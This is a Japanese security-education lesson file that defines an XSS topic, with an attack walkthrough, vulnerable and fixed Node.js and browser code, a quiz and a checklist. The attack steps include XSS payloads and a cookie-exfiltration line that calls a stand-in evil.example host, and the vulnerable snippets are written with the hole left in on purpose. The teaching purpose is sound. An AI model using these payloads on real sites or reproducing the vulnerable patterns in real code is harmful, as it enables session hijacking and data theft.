/**
 * トピック01: クロスサイトスクリプティング（XSS）
 * カテゴリ: インジェクション
 *
 * このファイルは後続エージェント向けの「完成見本」を兼ねる。
 * CONTENT_SPEC.mdのスキーマに沿って、ダミーではない本物の教材として書いている。
 */
registerTopic({
  id: 1,
  category: "インジェクション",
  title: "クロスサイトスクリプティング（XSS）",
  summary: "利用者の入力がそのままHTMLとして出力され、任意のスクリプトが被害者のブラウザで動く脆弱性。",
  keywords: ["XSS", "cross site scripting", "反射型", "格納型", "DOM型", "サニタイズ", "エスケープ", "CSP", "innerHTML"],

  // 概要（HTML、400〜800字程度）
  overview: [
    "<p>クロスサイトスクリプティング（XSS）は、攻撃者が用意した<strong>JavaScriptを、被害者のブラウザ上で実行させる</strong>攻撃です。",
    "本来そのページを表示しているだけの利用者が、気付かないうちに攻撃者のコードを実行させられてしまいます。</p>",
    "<p>なぜ危険かというと、実行されたスクリプトは<strong>そのページと同じ権限</strong>を持つからです。",
    "ログイン中のユーザーがXSSを踏むと、攻撃者のスクリプトは<code>document.cookie</code>からセッションクッキーを盗んだり、",
    "ユーザーになりすまして送金・投稿・退会などの操作を代行したり、偽のログインフォームを表示して",
    "パスワードを盗んだりできます。同一オリジンポリシーは「別サイトからの干渉」は防ぎますが、",
    "「そのサイト自身のページ内で動くスクリプト」は正規のものとして扱うため、XSSはこの防御をすり抜けます。</p>",
    "<p>XSSは発生場所によって3タイプに分けられます。",
    "<strong>反射型</strong>はURLパラメータなどの入力がその場のレスポンスにそのまま出るもの、",
    "<strong>格納型</strong>は投稿内容などがDBに保存され、閲覧した全員に配信されるもの（被害が最も大きい）、",
    "<strong>DOM型</strong>はサーバーを介さずブラウザ内のJavaScriptが<code>innerHTML</code>などで入力を描画してしまうものです。",
    "共通する原因はただ一つ、<strong>「データ」であるべき利用者入力が「コード（HTML/JS）」として解釈されている</strong>ことです。</p>",
  ].join(""),

  // 攻撃の仕組み（攻撃者視点の番号付きステップ）
  attack: {
    scenario: "<p>コメント欄を持つブログを例に、格納型XSSでセッションを盗むまでの流れを追います（あくまで防御を理解するための説明です）。</p>",
    steps: [
      {
        title: "入力がそのまま表示される場所を探す",
        detail: "<p>攻撃者はまず、入力した文字がHTMLとしてそのまま反映される箇所を探します。" +
          "コメント欄に<code>&lt;b&gt;test&lt;/b&gt;</code>と入れて、太字の「test」が表示されれば、" +
          "タグがエスケープされずHTMLとして解釈されている証拠です。</p>",
      },
      {
        title: "スクリプトが動くか試す",
        detail: "<p>次に<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>や、" +
          "画像の読み込み失敗を利用した<code>&lt;img src=x onerror=alert(1)&gt;</code>を投稿します。" +
          "ダイアログが出れば、任意のJavaScriptを実行できると確認できます。</p>",
      },
      {
        title: "情報を盗む本番のペイロードを仕込む",
        detail: "<p>攻撃者は<code>alert</code>を、クッキーを外部へ送るコードに差し替えます。" +
          "たとえば画像取得に見せかけて<code>new Image().src='https://evil.example/c?d='+encodeURIComponent(document.cookie)</code>" +
          "のようなコードを投稿し、DBに保存させます。</p>",
      },
      {
        title: "被害者が閲覧した瞬間に実行される",
        detail: "<p>他のユーザーがそのコメントを開くと、保存されたスクリプトが被害者のブラウザで実行され、" +
          "セッションクッキーが攻撃者のサーバーへ送信されます。格納型では、ページを開いた全員が自動的に被害に遭います。</p>",
      },
      {
        title: "盗んだセッションでなりすます",
        detail: "<p>攻撃者は受け取ったセッションクッキーを自分のブラウザにセットし、被害者としてログイン状態を再現します。" +
          "パスワードを知らなくても、被害者本人として操作できてしまいます。</p>",
      },
    ],
    note: "<p>クッキーに<code>HttpOnly</code>属性が付いていれば<code>document.cookie</code>からは読めないため、" +
      "このクッキー窃取は防げます。ただしHttpOnlyはXSSそのものを止めるわけではなく、" +
      "画面改ざんや操作の代行といった被害は残ります。根本対策は次のコードのとおり出力時のエスケープです。</p>",
  },

  // 脆弱／修正コードの比較（1つ以上）
  codeComparison: [
    {
      title: "サーバー側：コメントの出力",
      lang: "JavaScript (Node.js / Express)",
      description: "利用者が投稿したコメントをHTMLに埋め込んで返す処理。文字列連結でHTMLを組み立てている点に注目します。",
      vulnerable: {
        label: "脆弱なコード",
        code: [
          "app.get('/comments', async (req, res) => {",
          "  const comments = await db.getComments();",
          "  const rows = comments",
          "    .map((c) => `<li>${c.body}</li>`)",
          "    .join('');",
          "  res.send(`<ul>${rows}</ul>`);",
          "});",
        ].join("\n"),
        highlights: [4],
        note: "<p><code>c.body</code>（利用者の入力）をエスケープせずテンプレートに差し込んでいます。" +
          "<code>&lt;img src=x onerror=...&gt;</code>のような入力はHTMLタグとして解釈され、そのまま実行されてしまいます。</p>",
      },
      fixed: {
        label: "修正したコード",
        code: [
          "function escapeHtml(s) {",
          "  return String(s)",
          "    .replace(/&/g, '&amp;').replace(/</g, '&lt;')",
          "    .replace(/>/g, '&gt;').replace(/\"/g, '&quot;')",
          "    .replace(/'/g, '&#39;');",
          "}",
          "",
          "app.get('/comments', async (req, res) => {",
          "  const comments = await db.getComments();",
          "  const rows = comments",
          "    .map((c) => `<li>${escapeHtml(c.body)}</li>`)",
          "    .join('');",
          "  res.send(`<ul>${rows}</ul>`);",
          "});",
        ].join("\n"),
        highlights: [1, 2, 3, 4, 5, 6, 11],
        note: "<p>出力の直前で<code>&lt; &gt; &amp; \" '</code>をHTMLエンティティに変換します。" +
          "こうすると<code>&lt;img&gt;</code>は画面に文字列「&lt;img&gt;」として表示されるだけで、タグとして解釈されません。" +
          "実務ではReactのJSXやテンプレートエンジン（Handlebars、EJSの<code>&lt;%= %&gt;</code>など）の自動エスケープを使うのが確実です。</p>",
      },
    },
    {
      title: "クライアント側：DOM型XSSを防ぐ",
      lang: "JavaScript (ブラウザ)",
      description: "URLのクエリを画面に表示するだけの処理。サーバーを経由しなくてもXSSは起こります。",
      vulnerable: {
        label: "脆弱なコード",
        code: [
          "const params = new URLSearchParams(location.search);",
          "const keyword = params.get('q');",
          "document.querySelector('#result')",
          "  .innerHTML = '検索語: ' + keyword;",
        ].join("\n"),
        highlights: [3, 4],
        note: "<p><code>innerHTML</code>にユーザー由来の文字列を渡すと、その中のタグが解釈されます。" +
          "<code>?q=&lt;img src=x onerror=alert(1)&gt;</code>のようなURLを踏ませるだけでスクリプトが動きます。</p>",
      },
      fixed: {
        label: "修正したコード",
        code: [
          "const params = new URLSearchParams(location.search);",
          "const keyword = params.get('q');",
          "document.querySelector('#result')",
          "  .textContent = '検索語: ' + keyword;",
        ].join("\n"),
        highlights: [3, 4],
        note: "<p><code>textContent</code>は渡した文字列を必ず「ただのテキスト」として扱うため、タグは実行されません。" +
          "どうしてもHTMLを挿入したい場合はDOMPurifyなどでサニタイズし、" +
          "<code>innerHTML</code>への生の代入は避けます。</p>",
      },
    },
  ],

  // 4択クイズ（3問）
  quiz: [
    {
      question: "格納型XSSが反射型XSSより一般に危険とされる主な理由はどれですか。",
      choices: [
        "攻撃コードがサーバーのDBに保存され、そのページを開いた利用者全員に配信されるため",
        "反射型と違い、HTTPSを使っていても防げないため",
        "攻撃者がサーバーの管理者権限を必ず取得できるため",
        "ブラウザのJavaScriptを無効にしても実行されるため",
      ],
      answerIndex: 0,
      explanation: "<p>格納型は攻撃コードがDBなどに永続化され、被害者が特別なURLを踏まなくても、" +
        "そのコンテンツを表示しただけで全員が被害に遭います。反射型は攻撃用URLを踏ませる必要があるぶん、" +
        "配信範囲が限定されます。HTTPSは通信の盗聴・改ざんを防ぐものでXSSとは別レイヤーであり、" +
        "XSSはサーバー権限の奪取やJavaScript無効環境での実行とは直接関係ありません。</p>",
    },
    {
      question: "XSSの最も確実な根本対策はどれですか。",
      choices: [
        "入力時に「script」という単語をブラックリストで除去する",
        "出力する文脈（HTML本文・属性値・JavaScript内など）に応じて適切にエスケープする",
        "クッキーにHttpOnly属性を付ける",
        "WAF（Web Application Firewall）を導入する",
      ],
      answerIndex: 1,
      explanation: "<p>XSSの原因は「データがコードとして解釈されること」なので、" +
        "出力の文脈に合わせたエスケープ（またはフレームワークの自動エスケープ）が根本対策です。" +
        "ブラックリストは<code>&lt;img onerror&gt;</code>など無数の回避手段があり破られます。" +
        "HttpOnlyはクッキー窃取を緩和するだけでXSS自体は止まらず、WAFは多層防御の補助であって根本対策にはなりません。</p>",
    },
    {
      question: "クライアント側のDOM型XSSを避けるうえで適切なのはどれですか。",
      choices: [
        "ユーザー入力を表示するとき、innerHTMLの代わりにtextContentを使う",
        "すべての通信をHTTPSにする",
        "サーバー側でだけエスケープしていれば、ブラウザ側は考慮しなくてよい",
        "eval() を使って入力を評価してから表示する",
      ],
      answerIndex: 0,
      explanation: "<p>DOM型XSSはブラウザ内のJavaScriptが<code>innerHTML</code>などで入力をHTMLとして描画することで起きます。" +
        "<code>textContent</code>なら文字列として安全に表示できます。DOM型はサーバーを経由しないため、" +
        "サーバー側のエスケープだけでは防げません。<code>eval()</code>はむしろ任意コード実行の温床で、絶対に避けます。" +
        "HTTPSは通信保護の話でXSSの防御ではありません。</p>",
    },
  ],

  // 実務チェックリスト（5〜8項目）
  checklist: [
    "利用者由来の値をHTMLに出力する箇所を洗い出し、すべて出力時にエスケープしている（フレームワークの自動エスケープを含む）",
    "<code>innerHTML</code>・<code>outerHTML</code>・<code>document.write</code>・<code>insertAdjacentHTML</code>への生の代入がないか検索して確認した",
    "どうしてもHTMLを挿入する箇所はDOMPurify等でサニタイズしている",
    "エスケープはHTML本文・属性値・URL・JavaScript文字列など、出力の文脈ごとに適切な方式を使っている",
    "Content-Security-Policy（CSP）を設定し、インラインスクリプトや外部への不正な送信を制限している（多層防御。詳細はトピック10）",
    "セッションクッキーに<code>HttpOnly</code>属性を付け、万一XSSされてもクッキーを読めないようにしている",
    "入力のバリデーションは補助として行い、XSS対策の主軸は「出力時のエスケープ」に置いている",
  ],

  // 参考資料（公式・一次情報。実在する定番URLのみ）
  references: [
    { title: "OWASP Cross Site Scripting (XSS)", url: "https://owasp.org/www-community/attacks/xss/", note: "XSSの定義と分類（英語）" },
    { title: "OWASP Cheat Sheet: Cross Site Scripting Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", note: "文脈別エスケープの実務ルール（英語）" },
    { title: "OWASP Cheat Sheet: DOM based XSS Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html", note: "DOM型XSSの防止（英語）" },
    { title: "MDN: Element.innerHTML のセキュリティ上の考慮点", url: "https://developer.mozilla.org/ja/docs/Web/API/Element/innerHTML", note: "innerHTMLの危険性（日本語）" },
    { title: "DOMPurify", url: "https://github.com/cure53/DOMPurify", note: "定番のHTMLサニタイザ" },
  ],
});
